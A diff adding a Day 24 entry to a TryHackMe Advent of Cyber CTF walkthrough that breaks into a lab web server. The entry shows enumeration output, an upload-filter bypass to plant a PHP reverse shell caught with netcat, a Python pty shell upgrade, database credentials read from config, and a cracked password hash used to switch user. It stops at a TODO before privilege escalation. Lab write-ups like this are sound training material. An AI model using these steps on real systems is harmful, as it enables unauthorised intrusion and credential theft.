@@ -29,7 +29,7 @@ Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christ
 - [x] [Day 21 - Time for some ELForensics](#day-21-time-for-some-elforensics)
 - [x] [Day 22 - Elf McEager becomes CyberElf](#Day-22-Elf-McEager-becomes-CyberElf)
 - [x] [Day 23 - The Grinch strikes again!](#Day-23-The-Grinch-strikes-again)
-- [ ] Day 24 - The Trial Before Christmas
+- [x] [Day 24 - The Trial Before Christmas](#Day-24-The-Trial-Before-Christmas)
 
 ## Day 1: A Christmas Crisis
 
@@ -2410,3 +2410,289 @@ It seems like it starts to run an executable file at `C:\Users\Administrator\Des
 ### Looking for a VSS scheduled task
 
 Looking through the scheduled tasks, we also find `ShadowCopyVolume{7a9eea15-0000-0000-0000-010000000000}` which seems to be the part of the Volume Shadow Copu Service.
+
+## Day 24: The Trial Before Christmas
+
+*Category: Special*  
+*Tags: Web, Linux*  
+*Special Contributer: DarkStar7471*
+
+> Ready for one last challenge to make sure you've earned your presents this year? Use the skills gained throughout Advent of Cyber to prove your mettle and conquer day twenty four!
+
+IP: `10.10.126.85`
+
+### Basic Enumeration
+
+As always, we start off with an Nmap scan.
+
+```
+# Nmap 7.80 scan initiated Thu Dec 24 15:23:48 2020 as: nmap -sC -sV -vvv -oN nmap.log 10.10.126.85
+Nmap scan report for 10.10.126.85
+Host is up, received syn-ack (0.16s latency).
+Scanned at 2020-12-24 15:23:48 EST for 37s
+Not shown: 998 closed ports
+Reason: 998 conn-refused
+PORT      STATE SERVICE REASON  VERSION
+80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+65000/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Light Cycle
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Dec 24 15:24:25 2020 -- 1 IP address (1 host up) scanned in 36.97 seconds
+```
+
+### What is the title of the webpages
+
+A copy of the `TryHackMe` website is running on port 80 and `Light Cycle` is running on port 65000.
+
+### Gobuster
+
+I then ran gobuster on both ports.
+
+```
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ gobuster -u 10.10.126.85 -w ~/ctf/common.txt -x php
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.126.85/
+[+] Threads      : 10
+[+] Wordlist     : /home/bluemoon/ctf/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : php
+[+] Timeout      : 10s
+=====================================================
+2020/12/24 16:05:52 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.hta.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/3 (Status: 301)
+/codes (Status: 301)
+/index.html (Status: 200)
+/server-status (Status: 403)
+=====================================================
+2020/12/24 16:07:35 Finished
+=====================================================
+```
+
+```
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ gobuster -u http://10.10.126.85:65000 -w ~/ctf/common.txt -x php
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.126.85:65000/
+[+] Threads      : 10
+[+] Wordlist     : /home/bluemoon/ctf/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : php
+[+] Timeout      : 10s
+=====================================================
+2020/12/24 16:06:14 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.hta.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/api (Status: 301)
+/assets (Status: 301)
+/grid (Status: 301)
+/index.php (Status: 200)
+/index.php (Status: 200)
+/server-status (Status: 403)
+/uploads.php (Status: 200)
+=====================================================
+2020/12/24 16:07:53 Finished
+=====================================================
+```
+
+Looking at the `Light Cycle` website, `uploads.php` looks like where we can upload files and `/grid` looks ike a place where we can access the files we have uploaded.
+
+### Evading the upload filter
+
+At `http://10.10.126.85:65000/uploads.php`, we see an upload form.
+
+![screenshot](day24-the-trial-before-christmas/uploads.png)
+
+However, this is protected by both a server and client side filter. We can use BurpSuite to intercept the web traffic and then drop the request for `filter.js`. Next, we can mess with the file extension of a php reverse shell to get through the server side filter. We can rename `php-reverse-shell.php` as `php-reverse-shell.jpg.php`. We also see that any file we upload ends up in the `/grid/` directory.
+
+![screenshot](day24-the-trial-before-christmas/grid.png)
+
+Next, we set up a netcat listener and wait for the connection to come through once we click on it!
+
+```
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.126.85 60820
+Linux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 21:31:02 up 32 min,  0 users,  load average: 0.00, 0.00, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+JACKPOT!
+
+### Getting web flag: `web.txt`
+
+Since we are currently `www-data`, we will probably find the `web.txt` file in our home directory: `/var/www`.
+
+```
+$ cat /var/www/web.txt
+THM{ENTER_THE_GRID}
+```
+
+Web Flag: `THM{ENTER_THE_GRID}`
+
+### Spawning a stable shell using Python
+
+We can use python to spawn a stable shell
+
+```
+$ python3 -c "import pty; pty.spawn('/bin/bash')"
+www-data@light-cycle:/var/www$ 
+```
+
+### Poking through the filesystem
+
+Although `www-data` is very unpriviledged, we can still look through the `/var/www` folder. One particularly interesting file is `/var/www/TheGrid/includes/dbauth.php` which contains the credentials to a MySQL database: `tron:IFightForTheUsers`.
+
+```php
+<?php
+        $dbaddr = "localhost";
+        $dbuser = "tron";
+        $dbpass = "IFightForTheUsers";
+        $database = "tron";
+
+        $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);
+        if($dbh->connect_error){
+                die($dbh->connect_error);
+        }
+?>
+```
+
+### Accessing the database
+
+Now we can poke through the MySQL database. Run `mysql -u tron -p` in the terminal to get access to the MySQL command line interface.
+
+```
+www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p
+mysql -u tron -p
+Enter password: IFightForTheUsers
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 6
+Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+```
+
+It looks like there are only 1 interesting database.
+
+```
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| tron               |
++--------------------+
+2 rows in set (0.01 sec)
+```
+
+Let's take a look inside.
+
+```
+mysql> use tron;
+use tron;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++----------------+
+| Tables_in_tron |
++----------------+
+| users          |
++----------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT * FROM users;
+SELECT * FROM users;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
++----+----------+----------------------------------+
+1 row in set (0.00 sec)
+```
+
+### Cracking the password hash
+
+It seems like this developer did one thing right. He hashed the password. However, the user used a very common password so we can easily crack it using `https://crackstation.net/` or a similar site. It seems like his flynn's password is `@computer@`.
+
+### Becoming Flynn
+
+Now that we know have some more credentials, we can log in using `flynn:@computer@`
+
+```
+www-data@light-cycle:/$ su flynn
+su flynn
+Password: @computer@
+
+flynn@light-cycle:/$
+```
+
+### Getting user flag: `user.txt`
+
+The user flag is stored in the user's home directory. We now have the permissions to read it.
+
+```
+flynn@light-cycle:~$ cat /home/flynn/user.txt
+cat /home/flynn/user.txt
+THM{IDENTITY_DISC_RECOGNISED}
+```
+
+User Flag: `THM{IDENTITY_DISC_RECOGNISED}`
+
+### Privilege Escalation
+
+Let's run the `id` command to see what groups flynn is in.
+
+```
+flynn@light-cycle:~$ id
+id
+uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
+```
+
+TODO
